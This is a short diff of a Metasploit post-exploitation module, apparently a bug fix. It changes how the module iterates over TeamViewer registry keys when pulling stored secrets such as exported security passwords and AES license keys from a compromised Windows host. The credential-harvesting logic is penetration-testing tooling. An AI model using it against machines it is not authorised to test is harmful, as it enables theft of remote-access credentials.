@@ -51,18 +51,18 @@ class MetasploitModule < Msf::Post
   def app_list
     results = ''
     keys = [
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version7', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version8', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version9', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version10', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version11', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version12', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version13', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version14', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version15', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer', 'Version' ],
-      [ 'HKLM\\SOFTWARE\\TeamViewer\\Temp', 'SecurityPasswordExported' ],
-      [ 'HKLM\\SOFTWARE\\TeamViewer', 'Version' ],
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version7',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version8',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version9',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version10',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version11',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version12',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version13',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version14',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version15',
+      'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer',
+      'HKLM\\SOFTWARE\\TeamViewer\\Temp',
+      'HKLM\\SOFTWARE\\TeamViewer',
     ]
 
     locations = [
@@ -74,7 +74,7 @@ class MetasploitModule < Msf::Post
       { value: 'LicenseKeyAES', description: 'Perpetual License Key' }, # for <= v14
     ]
 
-    keys.each_key do |parent_key|
+    keys.each do |parent_key|
       locations.each do |location|
         secret = registry_getvaldata(parent_key, location[:value])
         next if secret.nil?
